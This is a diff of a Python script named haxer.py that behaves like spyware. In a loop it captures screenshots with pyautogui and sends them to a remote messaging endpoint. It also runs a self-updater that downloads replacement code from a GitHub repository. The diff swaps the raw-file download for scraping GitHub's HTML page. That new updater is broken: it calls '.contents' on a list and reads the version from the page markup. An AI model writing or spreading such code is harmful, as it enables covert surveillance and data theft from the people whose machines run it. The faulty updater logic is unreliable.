@@ -1,5 +1,6 @@
-V=0.01
+V=0.02
 import requests, time, pyautogui, datetime, io, inspect, os
+from bs4 import BeautifulSoup
 
 def sendMsg(content, image=""):
   files = {}
@@ -21,11 +22,13 @@ while True:
   sendMsg(f"# Update at {str(datetime.datetime.now())}\nHallo\nScreenshot:", screenshot)
 
   # Self-Updater
-  r = requests.get("https://raw.githubusercontent.com/kiwuthegamer/Metamorphic/main/haxer.py")
+  r = requests.get("https://github.com/kiwuthegamer/Metamorphic/blob/main/haxer.py")
+  soup = BeautifulSoup(r.text)
+  rScript = soup.select(".Box-sc-g0xbh4-0.etfROT").contents[1]
+  rScriptVersion = r.text.splitlines()[0].split("=")[1]
+
   script = inspect.getsource(inspect.getmodule(inspect.currentframe()))
   scriptVersion = script.splitlines()[0].split("=")[1]
-  rScript = r.text
-  rScriptVersion = r.text.splitlines()[0].split("=")[1]
   if rScriptVersion != scriptVersion: # Check if an update is needed
     sendMsg("Found Script Update!")
     sendMsg("Updating Script")
